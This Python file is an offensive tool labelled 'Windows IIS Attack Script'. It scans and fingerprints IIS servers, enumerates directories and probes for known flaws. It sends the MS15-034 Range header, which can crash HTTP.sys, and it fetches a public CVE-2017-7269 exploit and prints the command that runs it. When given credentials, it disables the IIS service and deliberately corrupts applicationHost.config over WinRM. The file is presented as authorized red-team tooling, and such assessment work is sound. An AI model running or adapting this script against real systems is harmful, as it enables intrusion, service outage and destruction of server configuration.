#!/usr/bin/env python3
"""
Windows IIS Attack Script for Red Team Assessment
"""

import os
import sys
import argparse
import subprocess
import socket
import time
import re
import requests
from datetime import datetime

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_and_install_dependencies():
    """Install required dependencies for the script."""
    required_packages = [
        "requests", "colorama", "beautifulsoup4", "urllib3"
    ]
    
    print("[*] Checking and installing dependencies...")
    
    try:
        # Check if pip is installed
        subprocess.check_call([sys.executable, "-m", "pip", "--version"], 
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError:
        print("[!] pip is not installed. Installing pip...")
        subprocess.check_call(["apt-get", "update"])
        subprocess.check_call(["apt-get", "install", "-y", "python3-pip"])
    
    # Install required packages
    for package in required_packages:
        try:
            print(f"[*] Checking {package}...")
            __import__(package)
            print(f"[+] {package} is already installed.")
        except ImportError:
            print(f"[!] {package} not found. Installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    
    # Install additional tools
    tools = [
        ("nmap", "nmap"),
        ("nuclei", "nuclei"),
        ("gobuster", "gobuster")
    ]
    
    for tool_name, package_name in tools:
        try:
            subprocess.check_call(["which", tool_name], 
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f"[+] {tool_name} is already installed.")
        except subprocess.CalledProcessError:
            print(f"[!] Installing {tool_name}...")
            if tool_name == "nuclei":
                try:
                    # Install Nuclei using GO
                    subprocess.check_call(["go", "install", "-v", "github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"])
                except subprocess.CalledProcessError:
                    print("[!] Failed to install nuclei via Go. Make sure Go is installed.")
                    print("[!] You can install Go with: apt-get install golang")
            else:
                subprocess.check_call(["apt-get", "update"])
                subprocess.check_call(["apt-get", "install", "-y", package_name])
    
    print("[+] All dependencies installed successfully.")

def log_activity(message):
    """Log all activities with timestamp."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("iis_attack.log", "a") as f:
        f.write(f"[{timestamp}] {message}\n")
    print(f"[{timestamp}] {message}")

def check_connectivity(target_ip):
    """Check if the target is reachable."""
    try:
        # Check if host is up (simple ping)
        subprocess.check_call(["ping", "-c", "1", "-W", "2", target_ip], 
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        log_activity(f"Target {target_ip} is reachable.")
        return True
    except subprocess.CalledProcessError:
        log_activity(f"Target {target_ip} is not reachable.")
        return False

def identify_web_ports(target_ip):
    """Identify web ports using quick nmap scan."""
    log_activity(f"Scanning {target_ip} for web ports...")
    
    try:
        cmd = ["nmap", "-p", "80,443,8080,8443", "-sV", "--open", target_ip]
        log_activity(f"Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        with open("web_ports_scan.txt", "w") as f:
            f.write(result.stdout)
            
        # Find open ports
        web_ports = []
        for line in result.stdout.splitlines():
            # Look for open ports
            match = re.search(r"(\d+)/tcp\s+open\s+(\S+)", line)
            if match:
                port = match.group(1)
                service = match.group(2)
                web_ports.append((port, service))
                log_activity(f"Found open web port: {port} ({service})")
        
        return web_ports
    except Exception as e:
        log_activity(f"Port scanning failed: {str(e)}")
        return []

def fingerprint_iis(target_ip, port):
    """Fingerprint IIS version and configuration."""
    log_activity(f"Fingerprinting IIS on {target_ip}:{port}...")
    
    try:
        # Use http or https based on port
        protocol = "https" if port in ["443", "8443"] else "http"
        url = f"{protocol}://{target_ip}:{port}"
        
        # Make request and check headers
        response = requests.get(url, verify=False, timeout=10)
        
        with open(f"iis_fingerprint_{port}.txt", "w") as f:
            f.write(f"Status code: {response.status_code}\n\n")
            f.write("Headers:\n")
            for header, value in response.headers.items():
                f.write(f"{header}: {value}\n")
            f.write("\nContent Preview:\n")
            f.write(response.text[:500] + "...\n")
        
        # Look for IIS version in server header
        server_header = response.headers.get('Server', '')
        if 'IIS' in server_header:
            iis_version = re.search(r'IIS/(\d+\.\d+)', server_header)
            if iis_version:
                version = iis_version.group(1)
                log_activity(f"Detected IIS version: {version}")
                return version
            else:
                log_activity("IIS detected but version not found in header")
                return "Unknown"
        else:
            log_activity("No IIS server header detected")
            return None
    except requests.exceptions.RequestException as e:
        log_activity(f"Error fingerprinting IIS: {str(e)}")
        return None

def directory_enumeration(target_ip, port):
    """Enumerate directories and files using gobuster."""
    log_activity(f"Starting directory enumeration on {target_ip}:{port}...")
    
    protocol = "https" if port in ["443", "8443"] else "http"
    url = f"{protocol}://{target_ip}:{port}"
    
    wordlists = [
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    ]
    
    # Select first available wordlist
    wordlist = None
    for wl in wordlists:
        if os.path.exists(wl):
            wordlist = wl
            break
    
    if not wordlist:
        log_activity("No suitable wordlist found. Installing dirbuster wordlists...")
        try:
            subprocess.run(["apt-get", "update"])
            subprocess.run(["apt-get", "install", "-y", "dirbuster"])
            if os.path.exists("/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"):
                wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            else:
                log_activity("Failed to find wordlist even after installing dirbuster")
                return
        except Exception as e:
            log_activity(f"Error installing wordlists: {str(e)}")
            return
    
    try:
        cmd = [
            "gobuster", "dir",
            "-u", url,
            "-w", wordlist,
            "-t", "50",
            "-o", f"gobuster_results_{port}.txt"
        ]
        
        # Add no TLS verify if HTTPS
        if protocol == "https":
            cmd.append("-k")
        
        # Add common ASP.NET extensions
        cmd.extend(["-x", "aspx,asp,ashx,asmx,config,txt"])
        
        log_activity(f"Running: {' '.join(cmd)}")
        subprocess.run(cmd)
        
        log_activity(f"Directory enumeration completed. Results saved to gobuster_results_{port}.txt")
    except Exception as e:
        log_activity(f"Directory enumeration failed: {str(e)}")

def check_shortname_disclosure(target_ip, port):
    """Check for IIS short name disclosure vulnerability."""
    log_activity(f"Checking for IIS short name disclosure on {target_ip}:{port}...")
    
    protocol = "https" if port in ["443", "8443"] else "http"
    url = f"{protocol}://{target_ip}:{port}"
    
    try:
        # Clone the tool if needed
        if not os.path.exists("IIS-ShortName-Scanner"):
            subprocess.run(["git", "clone", "https://github.com/irsdl/IIS-ShortName-Scanner.git"], check=True)
        
        # Run the scanner
        cmd = [
            "java", "-jar", "IIS-ShortName-Scanner/iis_shortname_scanner.jar", 
            "2", url
        ]
        
        log_activity(f"Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        with open(f"shortname_scan_{port}.txt", "w") as f:
            f.write(result.stdout)
        
        if "Vulnerable!" in result.stdout:
            log_activity("Target is VULNERABLE to IIS short name disclosure!")
        else:
            log_activity("Target does not appear vulnerable to IIS short name disclosure")
    except Exception as e:
        log_activity(f"Short name disclosure check failed: {str(e)}")

def check_iis_cve(target_ip, port, iis_version):
    """Check for known IIS CVEs based on version."""
    log_activity(f"Checking for known IIS vulnerabilities on {target_ip}:{port}...")
    
    if not iis_version or iis_version == "Unknown":
        log_activity("IIS version unknown, checking for common vulnerabilities")
    else:
        log_activity(f"Checking for vulnerabilities in IIS version {iis_version}")
    
    # Try to use Nuclei for scanning
    try:
        protocol = "https" if port in ["443", "8443"] else "http"
        url = f"{protocol}://{target_ip}:{port}"
        
        cmd = [
            "nuclei", 
            "-u", url,
            "-t", "http/iis",
            "-o", f"nuclei_iis_scan_{port}.txt"
        ]
        
        log_activity(f"Running: {' '.join(cmd)}")
        subprocess.run(cmd)
        
        log_activity(f"Nuclei scan completed. Results saved to nuclei_iis_scan_{port}.txt")
    except Exception as e:
        log_activity(f"Nuclei scan failed: {str(e)}")
    
    # Specific version-based checks
    if iis_version:
        # CVE-2017-7269 - Buffer overflow in WebDAV (IIS 6.0)
        if iis_version.startswith("6."):
            log_activity("IIS 6.0 detected - checking for WebDAV RCE vulnerability (CVE-2017-7269)")
            check_webdav_rce(target_ip, port)
        
        # CVE-2015-1635 - HTTP.sys RCE (IIS 7.x and 8.x)
        if iis_version.startswith(("7.", "8.")):
            log_activity("IIS 7.x/8.x detected - checking for HTTP.sys RCE vulnerability (CVE-2015-1635)")
            check_httpsys_vulnerability(target_ip, port)

def check_webdav_rce(target_ip, port):
    """Check for WebDAV RCE vulnerability (CVE-2017-7269)."""
    try:
        protocol = "https" if port in ["443", "8443"] else "http"
        url = f"{protocol}://{target_ip}:{port}"
        
        # First check if WebDAV is enabled
        headers = {
            'Host': target_ip,
            'User-Agent': 'Mozilla/5.0',
            'PROPFIND': '/'
        }
        
        response = requests.request("PROPFIND", url, headers=headers, verify=False, timeout=10)
        
        if response.status_code in [207, 200]:
            log_activity("WebDAV appears to be enabled")
            
            # Clone the exploit if needed
            if not os.path.exists("CVE-2017-7269"):
                subprocess.run(["git", "clone", "https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269.git", "CVE-2017-7269"], check=True)
            
            log_activity("WebDAV RCE exploit code downloaded. The script can be run with:")
            log_activity(f"python CVE-2017-7269/iis6-exploit-CVE-2017-7269.py {target_ip} {port}")
        else:
            log_activity("WebDAV does not appear to be enabled")
    except Exception as e:
        log_activity(f"WebDAV RCE check failed: {str(e)}")

def check_httpsys_vulnerability(target_ip, port):
    """Check for HTTP.sys vulnerability (CVE-2015-1635)."""
    try:
        protocol = "https" if port in ["443", "8443"] else "http"
        url = f"{protocol}://{target_ip}:{port}"
        
        # Special Range header that triggers the vulnerability
        headers = {
            'Host': target_ip,
            'Range': 'bytes=0-18446744073709551615'
        }
        
        log_activity("Testing for HTTP.sys Range header vulnerability...")
        response = requests.get(url, headers=headers, verify=False, timeout=10)
        
        # MS15-034 responses with 416 if patched, crashes or 500 if vulnerable
        if response.status_code == 416:
            log_activity("Target does not appear vulnerable to HTTP.sys RCE (received 416 response)")
        elif response.status_code >= 500:
            log_activity("Target might be VULNERABLE to HTTP.sys RCE! (received 500+ response)")
        else:
            log_activity(f"Unexpected response code: {response.status_code}. Manual verification recommended.")
    except requests.exceptions.RequestException as e:
        log_activity("Connection error during HTTP.sys check - target might be VULNERABLE and crashed!")
        log_activity(str(e))

def check_webconfig_disclosure(target_ip, port):
    """Check for exposed web.config files."""
    log_activity(f"Checking for exposed web.config files on {target_ip}:{port}...")
    
    protocol = "https" if port in ["443", "8443"] else "http"
    
    common_paths = [
        "/web.config",
        "/aspnet_client/web.config",
        "/aspnet_client/system_web/web.config",
        "/.vs/config/applicationhost.config"
    ]
    
    for path in common_paths:
        url = f"{protocol}://{target_ip}:{port}{path}"
        try:
            response = requests.get(url, verify=False, timeout=5)
            if response.status_code == 200 and ('<?xml' in response.text or '<configuration>' in response.text):
                log_activity(f"FOUND EXPOSED CONFIG FILE: {url}")
                
                with open(f"webconfig_{port}_{path.replace('/', '_')}.txt", "w") as f:
                    f.write(response.text)
            else:
                log_activity(f"No exposed config at {path}")
        except requests.exceptions.RequestException as e:
            log_activity(f"Error checking {path}: {str(e)}")

def check_upload_capabilities(target_ip, port):
    """Check for file upload capabilities."""
    log_activity(f"Checking for file upload capabilities on {target_ip}:{port}...")
    
    protocol = "https" if port in ["443", "8443"] else "http"
    
    # Common upload paths
    upload_paths = [
        "/upload.aspx",
        "/admin/upload.aspx",
        "/admin/fileupload.aspx",
        "/upload/upload.aspx",
        "/fileupload.aspx",
        "/uploadfile.aspx"
    ]
    
    for path in upload_paths:
        url = f"{protocol}://{target_ip}:{port}{path}"
        try:
            response = requests.get(url, verify=False, timeout=5)
            if response.status_code == 200 and ('upload' in response.text.lower() or 'file' in response.text.lower()):
                log_activity(f"Potential file upload page found: {url}")
            else:
                log_activity(f"No upload page at {path}")
        except requests.exceptions.RequestException as e:
            log_activity(f"Error checking {path}: {str(e)}")

def disable_iis_service(target_ip, port, username=None, password=None):
    """Attempt to disable IIS service if credentials are provided."""
    if not username or not password:
        log_activity("Credentials required to attempt service disruption")
        return
    
    log_activity(f"Attempting to disable IIS service on {target_ip}...")
    
    try:
        # First, create a PowerShell script
        ps_script = """
        Stop-Service -Name W3SVC -Force
        Set-Service -Name W3SVC -StartupType Disabled
        Write-Output "IIS service disabled successfully"
        """
        
        with open("disable_iis.ps1", "w") as f:
            f.write(ps_script)
        
        # Execute the script using WinRM
        cmd = [
            "winrm", "quickconfig", "-quiet",
            "winrs", 
            "-r:http://" + target_ip + ":5985", 
            "-u:" + username, 
            "-p:" + password, 
            "powershell -ExecutionPolicy Bypass -File disable_iis.ps1"
        ]
        
        log_activity(f"Running: winrs -r:http://{target_ip}:5985 -u:[username] -p:[password] powershell...")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if "successfully" in result.stdout:
            log_activity("IIS service disabled successfully")
        else:
            log_activity("Failed to disable IIS service")
            log_activity(result.stdout)
            log_activity(result.stderr)
    except Exception as e:
        log_activity(f"Error attempting to disable IIS: {str(e)}")

def corrupt_iis_config(target_ip, port, username=None, password=None):
    """Attempt to corrupt IIS configuration if credentials are provided."""
    if not username or not password:
        log_activity("Credentials required to attempt config corruption")
        return
    
    log_activity(f"Attempting to corrupt IIS configuration on {target_ip}...")
    
    try:
        # Create a PowerShell script to corrupt IIS config
        ps_script = """
        $configPath = "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"
        if (Test-Path $configPath) {
            # Backup the original file
            Copy-Item $configPath "$configPath.bak"
            
            # Read the file
            $content = Get-Content $configPath -Raw
            
            # Corrupt a critical section by inserting invalid XML
            $corruptedContent = $content -replace '<system.webServer>', '<system.webServer><!-- RED TEAM WAS HERE --><invalidTag>'
            
            # Write the corrupted content back
            $corruptedContent | Set-Content $configPath
            
            Write-Output "IIS configuration corrupted successfully"
        } else {
            Write-Output "Config file not found at expected location"
        }
        """
        
        with open("corrupt_iis.ps1", "w") as f:
            f.write(ps_script)
        
        # Execute the script using WinRM
        cmd = [
            "winrs", 
            "-r:http://" + target_ip + ":5985", 
            "-u:" + username, 
            "-p:" + password, 
            "powershell -ExecutionPolicy Bypass -File corrupt_iis.ps1"
        ]
        
        log_activity(f"Running: winrs -r:http://{target_ip}:5985 -u:[username] -p:[password] powershell...")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if "successfully" in result.stdout:
            log_activity("IIS configuration corrupted successfully")
        else:
            log_activity("Failed to corrupt IIS configuration")
            log_activity(result.stdout)
            log_activity(result.stderr)
    except Exception as e:
        log_activity(f"Error attempting to corrupt IIS config: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description="Windows IIS Attack Script")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", help="Target port(s), comma separated (default: auto-detect)")
    parser.add_argument("-u", "--username", help="Username for authentication")
    parser.add_argument("-P", "--password", help="Password for authentication")
    parser.add_argument("--exploit", action="store_true", help="Attempt to exploit vulnerabilities if found")
    parser.add_argument("--disable", action="store_true", help="Attempt to disable IIS service if credentials provided")
    
    args = parser.parse_args()
    
    # Header
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║           WINDOWS IIS ATTACK FRAMEWORK            ║
    ║                                                   ║
    ║             !!! RED TEAM ONLY !!!                 ║
    ║     For authorized assessment purposes only       ║
    ║                                                   ║
    ╚═══════════════════════════════════════════════════╝
    """)
    
    # Check and install dependencies
    check_and_install_dependencies()
    
    # Initial checks
    if not check_connectivity(args.target):
        print(f"[!] Target {args.target} is not reachable. Exiting...")
        sys.exit(1)
    
    # Identify web ports if not specified
    if args.port:
        ports = args.port.split(",")
        log_activity(f"Using specified port(s): {', '.join(ports)}")
    else:
        web_ports = identify_web_ports(args.target)
        if not web_ports:
            log_activity("No web ports detected. Falling back to port 80 and 443.")
            ports = ["80", "443"]
        else:
            ports = [port for port, service in web_ports]
    
    # Process each port
    for port in ports:
        log_activity(f"Processing port {port}")
        
        # Fingerprint IIS
        iis_version = fingerprint_iis(args.target, port)
        
        if iis_version:
            # Run IIS-specific checks
            check_iis_cve(args.target, port, iis_version)
            check_shortname_disclosure(args.target, port)
            check_webconfig_disclosure(args.target, port)
            
            # Directory enumeration
            directory_enumeration(args.target, port)
            
            # Check for upload capabilities
            check_upload_capabilities(args.target, port)
            
            # Attempt service disruption if requested
            if args.disable and args.username and args.password:
                if input(f"Do you want to attempt to disable IIS on {args.target}? (y/n): ").lower() == 'y':
                    disable_iis_service(args.target, port, args.username, args.password)
                    corrupt_iis_config(args.target, port, args.username, args.password)
        else:
            log_activity(f"IIS not detected on port {port} or unable to fingerprint. Trying basic checks anyway.")
            directory_enumeration(args.target, port)
    
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║                                                   ║
    ║             ASSESSMENT COMPLETED                  ║
    ║                                                   ║
    ║      Check the generated output files for         ║
    ║      detailed results and next steps              ║
    ║                                                   ║
    ╚═══════════════════════════════════════════════════╝
    """)

if __name__ == "__main__":
    main()
